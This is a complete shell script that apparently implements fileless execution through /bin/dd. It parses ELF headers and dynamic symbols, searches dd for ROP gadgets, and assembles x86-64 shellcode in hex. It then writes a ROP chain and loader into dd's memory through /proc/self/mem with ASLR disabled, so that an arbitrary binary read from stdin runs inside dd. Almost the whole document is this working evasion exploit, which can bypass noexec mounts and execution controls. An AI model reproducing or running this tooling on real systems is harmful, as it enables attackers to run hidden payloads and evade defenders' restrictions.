#!/bin/sh

filename=/bin/dd

# Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
if [ -z "$DEBUG" ]; then DEBUG=0; fi

# If /bin/dd is not executable by your user you may try to run it through the
# the loader (typically ld).
if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi

# Endian conversion
endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

# search_section "file" $filename $section
# search_section "bin" "" $section (and the binary through stdin)
search_section()
{
    local data=""
    if [ $1 = "file" ]
    then
        local header=$(od -v -t x1 -N 64 $2 | head -n -1 |\
                       cut -d' ' -f 2- | tr -d ' \n')
    else
        read -r data
        local header=$(echo -n $data | base64 -d | od -v -t x1 -N 64 |\
                       head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    fi
    # I'm not commenting this, RTFM.
    local shoff=${header:80:16}
    shoff=$(endian $shoff)
    shoff=$((0x$shoff))
    local shentsize=${header:116:4}
    shentsize=$(endian $shentsize)
    shentsize=$((0x$shentsize))
    local shentnum=${header:120:4}
    shentnum=$(endian $shentnum)
    shentnum=$((0x$shentnum))
    local shsize=$((shentnum * shentsize))
    local shstrndx=${header:124:4}
    shstrndx=$(endian $shstrndx)
    shstrndx=$((0x$shstrndx))
    if [ $1 = "file" ]
    then
        sections=$(od -v -t x1 -N $shsize -j $shoff $2 | head -n-1 |\
            cut -d' ' -f2- | tr -d ' \n')
    else
        sections=$(echo -n $data | base64 -d | od -v -t x1 -N $shsize -j \
                   $shoff | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
    shstrtab_off=${sections:$shstrtab_off:16}
    shstrtab_off=$(endian $shstrtab_off)
    shstrtab_off=$((0x$shstrtab_off))
    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
    shstrtab_size=${sections:$shstrtab_size:16}
    shstrtab_size=$(endian $shstrtab_size)
    shstrtab_size=$((0x$shstrtab_size))
    if [ $1 = "file" ]
    then
        local strtab=$(od -v -t x1 -N $shstrtab_size -j $shstrtab_off $2 |\
                       head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local strtab=$(echo -n $data | base64 -d | od -v -t x1 -N \
                       $shstrtab_size -j $shstrtab_off | head -n-1 |\
                       cut -d' ' -f2- | tr -d ' \n')
    fi

    for i in $(seq 0 $((shentnum - 1)))
    do
        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
        local section_name_idx=$((0x$(endian ${section:0:8})))
        local name=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
        tr -d ' \n')00
        local section_name=${strtab:$section_name_idx * 2:${#name}}
        if [ $section_name = $name ]
        then
            local section_off=${section:24 * 2:16}
            section_off=$(endian $section_off)
            section_off=$((0x$section_off))

            local section_addr=${section:16 * 2:16}
            section_addr=$(endian $section_addr)
            section_addr=$((0x$section_addr))

            local section_size=${section:32 * 2:16}
            section_size=$(endian $section_size)
            section_size=$((0x$section_size))

            local section_size_ent=${section:56 * 2:16}
            section_size_ent=$(endian $section_size_ent)
            section_size_ent=$((0x$section_size_ent))

            echo -n $section_off $section_size $section_addr $section_size_ent
            break
        fi
    done
}
# search_symbol $filename $symbol1 $symbol2
search_symbol()
{
    local strtab_off=$(search_section file $1 .dynstr)
    local strtab_size=$(echo $strtab_off | cut -d' ' -f2)
    strtab_off=$(echo $strtab_off | cut -d' ' -f1)
    local strtab=$(od -v -t x1 $1 -N $strtab_size -j $strtab_off| head -n-1 |\
    cut -d' ' -f2- | tr -d ' \n')

    local symtab_off=$(search_section file $1 .dynsym)
    local symtab_size=$(echo $symtab_off | cut -d' ' -f2)
    local symtabentsize=$(echo $symtab_off | cut -d' ' -f4)
    symtab_off=$(echo $symtab_off | cut -d' ' -f1)
    local symtab=$(od -v -t x1 $1 -N $symtab_size -j $symtab_off| head -n-1 |\
    cut -d' ' -f2- | tr -d ' \n')
    local symtab_ent_num=$((symtab_size / symtabentsize))

    local name1=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
    tr -d ' \n')00
    local name2=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
    tr -d ' \n')00
    local len=0
    local aux=""
    if [ ${#name1} -ge ${#name2} ]
    then
        len=${#name1}
    else
        len=${#name2}
        aux=$name1
        name1=$name2
        name2=$aux
    fi

    local symbol1_off=""
    local symbol2_off=""
    for i in $(seq 0 $((symtab_ent_num - 1)))
    do
        local symtabent=${symtab:$((i*symtabentsize*2)):$((symtabentsize*2))}
        local symbol_name_idx=$((0x$(endian ${symtabent:0:8})))
        local symbol_name=${strtab:$symbol_name_idx * 2:$len}
        if [ $symbol_name = $name1 ]
        then
            symbol1_off=${symtabent:8 * 2:16}
            symbol1_off=$(endian $symbol1_off)
            symbol1_off=$((0x$symbol1_off))
        fi
        if [ ${symbol_name:0:${#name2}} = $name2 ]
        then
            symbol2_off=${symtabent:8 * 2:16}
            symbol2_off=$(endian $symbol2_off)
            symbol2_off=$((0x$symbol2_off))
        fi

        if [ -n "$symbol2_off" -a -n "$symbol1_off" ]
        then
            if [ -z $aux ]; then echo -n $symbol1_off $symbol2_off
            else                 echo -n $symbol2_off $symbol1_off; fi
            break
        fi
    done
}

# shellcode_loader "bin"
# shellcode_loader "file" $filename $base $pathaddr
shellcode_loader()
{
    if [ $1 = "bin" ]
    then
        local header=$(echo $bin | base64 -d | od -t x1 -N 64 | head -n-1 |\
                       cut -d' ' -f2- | tr -d ' \n')
    else
        local header=$(od -tx1 -N 64 $2 | head -n-1 | cut -d' ' -f2- |\
                       tr -d ' \n')
    fi
    local phoff=$((0x$(endian ${header:64:16})))
    local phentsize=$((0x$(endian ${header:108:4})))
    local phnum=$((0x$(endian ${header:112:4})))
    local phsize=$(($phnum * $phentsize))
    if [ $1 = "bin" ]
    then
        local phtab=$(echo $bin | base64 -d | od -vtx1 -N $phsize -j $phoff |\
                      head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local phtab=$(od -vtx1 -N $phsize -j $phoff $2 | head -n-1 |\
                      cut -d' ' -f2- | tr -d ' \n')
    fi

    local entry=$((0x$(endian ${header:48:16})))

    local base=0
    local writebin=""
    local sc=""
    if [ $1 = "bin" ]
    then
        sc=$sc"4d31c04d89c149f7d041ba32000000" # Prepare for the mmap()s
    else
        sc=$sc"4831c04889c6b00248bf"$(endian $4)"0f05" # open() the file
        sc=$sc"4989c041ba12000000" # and prepare for the mmap()s
    fi

    for i in $(seq 0 $((phnum - 1)))
    do
        local phent=${phtab:$((i * phentsize * 2)):$((phentsize * 2))}
        local phenttype=${phent:0:8}
        local prot=$(endian ${phent:8:8})
        if [ $phenttype = "51e57464" ] # type == GNU_STACK
        then
            if [ $((0x$prot & 1)) -eq 1 ] # Stack must be executable
            then
                local stack_bottom=$(echo "$dd_maps" | grep -F "[stack]" |\
                                     cut -d' ' -f1)
                local stack_top=$(echo $stack_bottom | cut -d'-' -f2)
                local stack_bottom=0000$(echo $stack_bottom | cut -d'-' -f1)
                local stack_size=$((0x$stack_top - 0x$stack_bottom))
                stack_size=$(printf %08x $stack_size)
                sc=$sc"4831c0b00a"
                sc=$sc"48bf"$(endian $stack_bottom)
                sc=$sc"be"$(endian $stack_size)
                sc=$sc"ba""07000000" # RWX
                sc=$sc"0f05"
            fi
            continue
        fi
        if [ $phenttype != "01000000" ]; then continue; fi # type != LOAD
        local offset=$(endian ${phent:16:16})
        local virt=$(endian ${phent:32:16})
        local fsize=${phent:64:16}
        local memsz=$(endian ${phent:80:16})

        if [ $((0x$offset)) -eq 0 ]
        then
            if [ $((0x$virt)) -lt $((0x400000)) ] # PIE binaries
            then
                if [ $1 = "bin" ]
                then
                    base=$((0x400000))
                else
                    base=$((0x$3))
                fi
                entry=$((entry + base))
            fi
        fi
        virt=$(printf %016x $((0x$virt + base)))

        local finalvirt=$((((0x$virt + 0x$memsz) & (~0xfff)) + 0x1000))

        local origvirt=$(endian $virt)
        virt=$((0x$virt & (~0xfff))) # The mapping must be aligned
        memsz=$((finalvirt - virt)) # True size of the mapping
        memsz=$(endian $(printf %08x $memsz))
        virt=$(endian $(printf %016x $virt))

        local perm=0
        if [ $((0x$prot & 1)) -eq 1 ]; then perm=$((perm | 4)); fi
        if [ $((0x$prot & 2)) -eq 2 ]; then perm=$((perm | 2)); fi
        if [ $((0x$prot & 4)) -eq 4 ]; then perm=$((perm | 1)); fi
        perm=$(endian $(printf %08x $perm))
        if [ $1 = "bin" ]
        then
            # mmap()
            sc=$sc"4831c0b00948bf"$virt
            sc=$sc"be"$memsz
            sc=$sc"ba""03000000" # RW
            sc=$sc"0f05"

            # read()
            sc=$sc"4831ff48be${origvirt}48ba${fsize}4889f80f05"
            # and make sure to read exactly $fsize bytes
            sc=$sc"4829c24801c64885d275f0"

            # mprotect()
            sc=$sc"4831c0b00a"
            sc=$sc"48bf"$virt
            sc=$sc"be"$memsz
            sc=$sc"ba"$perm
            sc=$sc"0f05"

            # Pieces of the binary that we need to write
            # (we only load things the binary itself asks us to)
            writebin=$writebin$(echo $bin | base64 -d | od -v -t x1 -N \
                     $((0x$(endian $fsize))) -j $((0x$offset)) |\
                     head -n-1 | cut -d' ' -f2- | tr -d ' \n')
        else
            # mmap requires the offset to be aligned to 0x1000 too
            local off=$((0x$offset & (~0xfff)))
            off=$(printf %016x $off)

            local sc2=""
            local filelen=$((($(wc -c < $2) & (~0xfff)) + 0x1000))
            # If the mapping exceeds the file, split it into two
            # (some Linux distros, like Alpine, don't like it)
            if [ $((0x$off + 0x$(endian $memsz))) -gt $filelen ]
            then
                local diff=$((0x$off + 0x$(endian $memsz) - $filelen))
                memsz=$((0x$(endian $memsz) - diff))
                local virt2=$((0x$(endian $virt) + memsz))
                virt2=$(endian $(printf %016x $virt2))
                memsz=$(endian $(printf %08x $memsz))
                diff=$(endian $(printf %08x $diff))
                sc2="4d89c44d31c04d89c149f7d041ba32000000"
                sc2=$sc2"4831c0b00948bf"$virt2
                sc2=$sc2"be"$diff
                sc2=$sc2"ba"$perm
                sc2=$sc2"0f05"
                sc2=$sc2"4d89e0"
            fi

            # mmap()
            sc=$sc"4831c0b00948bf"$virt
            sc=$sc"be"$memsz
            sc=$sc"ba"$perm
            sc=$sc"49b9"$(endian $off)
            sc=$sc"0f05"

            sc=$sc$sc2
        fi

        if [ $((0x$offset)) -eq 0 ]
        then
            phaddr=$((phoff + 0x$(endian $origvirt)))
        fi
    done
    entry=$(endian $(printf %016x $entry))

    # Zero the bss
    local bss_addr=0
    if [ $1 = "file" ]
    then
        sc=$sc"4831c0b0034c89c70f05" # close() the file
        bss_addr=$(search_section file $2 .bss | cut -d' ' -f3)
    else
        bss_addr=$(echo -n $bin | search_section bin "" .bss | cut -d' ' -f3)
    fi
    if [ -n "$bss_addr" ]
    then
        bss_addr=$((bss_addr + base))
        # Zero until the end of page
        local bss_size=$((((bss_addr + 0x1000) & (~0xfff)) - bss_addr))
        bss_addr=$(printf %016x $bss_addr)
        bss_size=$((bss_size / 8))
        bss_size=$(printf %08x $bss_size)
        sc=$sc"4831c0b9"$(endian $bss_size)"48bf"$(endian $bss_addr)"f348ab"
    fi

    phnum=$(endian $(printf %016x $phnum))
    phentsize=$(endian $(printf %016x $phentsize))
    phaddr=$(endian $(printf %016x $phaddr))

    echo -n "$sc $writebin $phnum $phentsize $phaddr $entry"
}
# craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv0 .. $argvn
craft_stack()
{
    local stack_top=$(echo "$dd_maps" | grep -F "[stack]" |\
                      cut -d' ' -f1 | cut -d'-' -f2)
    # Calculate position of argv[0]
    args_len=$(echo "$@" | cut -d' ' -f6- | wc -c)
    argv0_addr=$((0x$stack_top - 8 - $args_len))

    # Place arguments for main()
    local count=0
    local stack=$(endian $(printf %016x $(($# - 5)))) # argc
    local argvn_addr=$argv0_addr
    local args=""
    for arg in "$@"
    do
        if [ $count -lt 5 ]; then count=$((count + 1)); continue; fi;
        stack=$stack$(endian $(printf %016x $argvn_addr)) # argv[n]
        args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 |\
                    cut -d' ' -f 2- | tr -d ' \n')00
        argvn_addr=$((argvn_addr + ${#arg} + 1))
    done
    # argv[argc] = NULL; envp[0] = NULL;
    stack=$stack"00000000000000000000000000000000"

    for i in $(seq $((argv0_addr - (argv0_addr & (~7)))))
    do
        args="00"$args
    done

    local at_random=$(((argv0_addr & (~7)) - 16))
    local auxv_len=$((8 * 2 * 8))
    # Keep the stack aligned (following orders from System V)
    if [ $((((${#stack} + ${#args} + $auxv_len) / 2) & 0xf)) -eq 0 ]
    then
        args="0000000000000000"$args
        at_random=$((at_random - 8))
    fi

    # Auxiliary vector
    at_random=$(endian $(printf %016x $at_random))
    local auxv=""
    auxv=$auxv"0300000000000000"$1                 # phaddr
    auxv=$auxv"0400000000000000"$2                 # phentsize
    auxv=$auxv"0500000000000000"$3                 # phnum
    auxv=$auxv"0700000000000000"$(endian $4)       # ld_base
    auxv=$auxv"0900000000000000"$5                 # entry
    auxv=$auxv"1900000000000000"$at_random         # AT_RANDOM
    auxv=$auxv"0600000000000000""0010000000000000" # AT_PAGESZ
    auxv=$auxv"0000000000000000""0000000000000000" # AT_NULL
    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Will be two random values

    stack=$stack$auxv$args"0000000000000000" # NULL at the end of the stack

    # read() all this data into the stack and make rsp point to it
    local sc=""
    local stack_len=$((${#stack} / 2))
    local rsp=$(endian $(printf %016x $((0x$stack_top - $stack_len))))
    stack_len=$(endian $(printf %08x $stack_len))
    sc=$sc"48bc"$rsp
    sc=$sc"4831ff4889e6ba${stack_len}4889f80f0529c24801c685d275f3"

    # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
    sc=$sc"48bb"$at_random
    sc=$sc"64488b04252800000048890380c30864488b042530000000488903"

    echo -n $stack $sc
}
craft_payload2()
{
    local sc=""
    # Load binary
    local loadbinsc=$(shellcode_loader bin)
    local writebin=$(echo $loadbinsc | cut -d' ' -f2)
    local phnum=$(echo $loadbinsc | cut -d' ' -f3)
    local phentsize=$(echo $loadbinsc | cut -d' ' -f4)
    local phaddr=$(echo $loadbinsc | cut -d' ' -f5)
    local entry=$(echo $loadbinsc | cut -d' ' -f6)
    sc=$sc$(echo $loadbinsc | cut -d' ' -f1)

    local ld_base=0000$(echo "$dd_maps" | grep `readlink -f $interp` |\
                        head -n1 | cut -d'-' -f1)

    ### Initial stack structures. Arguments and a rudimentary auxv ###
    local stack=$(craft_stack $phaddr $phentsize $phnum $ld_base $entry "$@")
    sc=$sc$(echo $stack | cut -d' ' -f2)
    stack=$(echo $stack | cut -d' ' -f1)

    # dd makes stdin and stdout point to the input and output of data (if & of)
    # Fortunately stderr still points to the terminal, so we can make
    # dup2(2, 1); dup2(2, 0); to fix this
    sc=${sc}"4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"

    if [ -n "$(echo -n $bin | search_section bin "" .interp)" ] # Dynamic binary
    then
        # Load the loader (wait... a-are we the kernel now?)
        local loadldsc=$(shellcode_loader file $interp $ld_base $interp_addr)
        sc=${sc}$(echo $loadldsc | cut -d' ' -f1)

        # Jump to the loader and let it do the rest
        ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
        ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
        ld_start_addr=$(printf %016x $ld_start_addr)

        sc=$sc"48b8"$(endian $ld_start_addr)
    else                                                        # Static binary
        sc=$sc"48b8"$entry # Just jump to the binary's entrypoint
    fi
    # Nothing happened here, dd never existed.
    # It was all a dream!
    sc=$sc"ffe0"

    if [ $DEBUG -eq 1 ]; then sc="ebfe"$sc; fi

    local sc_len=$(printf "%016x" $((${#sc} / 2)))
    echo -n $sc_len $sc$writebin$stack
}

find_gadget()
{
    local off=""
    local text_off=$(search_section file $1 .text)
    local text_size=$(echo $text_off | cut -d' ' -f2)
    text_off=$(echo $text_off | cut -d' ' -f1)

    if [ -n "$(grep --help 2>&1 | grep "byte-offset")" ]
    then
        off=$(tail $1 -c +$text_off | head -c $text_size | od -v -t x1 |\
              head -n-1 | cut -d' ' -f2- | tr -d ' \n' | grep -a -b -F -o $3 |\
              head -n1 | cut -d':' -f1)
        off=$((off / 2 - 1))
    else # busybox's grep does not include this option
        local text=$(tail $1 -c +$text_off | head -c $text_size |\
                     od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
        local after=${text#*$3}
        off=$(((${#text} - ${#after} - ${#3} - 1) / 2))
    fi
    off=$((off + $text_off + 0x$2))

    printf $(endian $(printf %016x $off))
}
craft_rop()
{
    # Where is located the libc without ASLR in this system
    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
                      cut -d'-' -f1)
    libc_base=$((0x$libc_base))

    local pop_rdi=$(find_gadget $filename $dd_base "5fc3")
    local pop_rsi=$(find_gadget $filename $dd_base "5ec3")
    local pop_rdx=$(find_gadget $filename $dd_base "5ac3")
    local ret=$(find_gadget $filename $dd_base "c3")
    local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
    map_size=$(endian $(printf %016x $map_size))

    # Find address of mprotect() and read() in the libc
    local mprotect_offset=$(search_symbol $libc_path mprotect read)
    local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
    mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
    local mprotect_addr=$(($mprotect_offset + $libc_base))
    mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
    local read_addr=$(($read_offset + $libc_base))
    read_addr=$(endian $(printf "%016x" $read_addr))

    local rop=""
    rop=$rop$pop_rdi
    rop=$rop"0000000000000000"
    rop=$rop$pop_rsi
    rop=$rop$sc_addr
    rop=$rop$pop_rdx
    rop=$rop$(endian $1)
    rop=$rop$read_addr

    rop=$rop$pop_rdi
    rop=$rop$sc_addr
    rop=$rop$pop_rsi
    rop=$rop$map_size
    rop=$rop$pop_rdx
    rop=$rop"0500000000000000" # R X
    rop=$rop$mprotect_addr

    rop=$rop$sc_addr

    local retsled=""
    for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
    do
        retsled=$retsled$ret
    done
    echo -n $retsled$rop
}

# Program we are trying to execute
read -r bin

if [ $(command -v linux64) ]
then
    noaslr="linux64 -R"
elif [ $(command -v setarch) ]
then
    noaslr="setarch `uname -m` -R"
else
    echo Error: I need some tool to disable ASLR. >&2
    exit
fi

# Make zsh behave somewhat like bash
if [ -n "$(/proc/self/exe --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

# Which interpreter (loader) does this dd need? (we've to parse its headers)
interp_off=$(search_section file $filename .interp)
interp_size=$(echo $interp_off | cut -d' ' -f2)
interp_off=$(echo $interp_off | cut -d' ' -f1)
interp=$(tail -c +$(($interp_off + 1)) $filename | head -c $((interp_size - 1)))
if [ $USE_INTERP -eq 1 ]; then interp_=$interp; else interp_=""; fi

# dd's mappings
dd_maps=$($noaslr $interp_ $filename if=/proc/self/maps 2> /dev/null)
# Where is the dd binary loaded without ASLR
dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
              head -n1 | cut -d'-' -f1)

# Address of the string with the path to the loader
interp_addr=$(printf %016x $((interp_off + $((0x$dd_base)))))


## 2nd payload: Shellcode, needed parts of the binary & stack's initial content
payload2=$(craft_payload2 "$@")
sc_len=$(echo $payload2 | cut -d' ' -f1)
payload2=$(echo $payload2 | cut -d' ' -f2)

# Find path to the libc
libc_path=$(LD_TRACE_LOADED_OBJECTS=1 $filename < /dev/null 2> /dev/null)
if [ -n "$libc_path" ] # System with ld
then
    libc_path=$(echo "$libc_path" | grep libc)
    libc_path=$(echo $libc_path | cut -d' ' -f3)
    libc_path=$(readlink -f $libc_path)
else # System with musl
    libc_path=$($interp --list $filename | grep libc)
    libc_path=$(echo $libc_path | cut -d' ' -f3)
fi

# We will load the second stage (shellcode) in the .bss of dd
sc_addr=$(search_section file $filename .bss | cut -d' ' -f3)
sc_addr=$(((sc_addr + 0x$dd_base) & (~0xfff)))
sc_addr=$(endian $(printf %016x $sc_addr))

## 1st payload: ROP
rop=$(craft_rop $sc_len)
rop_len=$((${#rop} / 2))

# Position in the stack we start to overwrite. We are trying to overflow
# write()'s stack and take control from there. I've found experimentally that
# the RIP(s) for write() is always in the last page of the stack, and that it is
# consistent across versions and compilations of dd... in ARM too!
write_to_addr=$(echo "$dd_maps" | grep -F "[stack]" | cut -d' ' -f1 |\
                cut -d'-' -f2)
write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))


payload=$(printf %s "$rop$payload2" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
# I'm going in, wish me luck...
printf %b "$payload" |\
(sleep .1; $noaslr env -i $interp_ $filename bs=$rop_len count=1    \
of=/proc/self/mem seek=$write_to_addr conv=notrunc oflag=seek_bytes \
iflag=fullblock) 2>&1
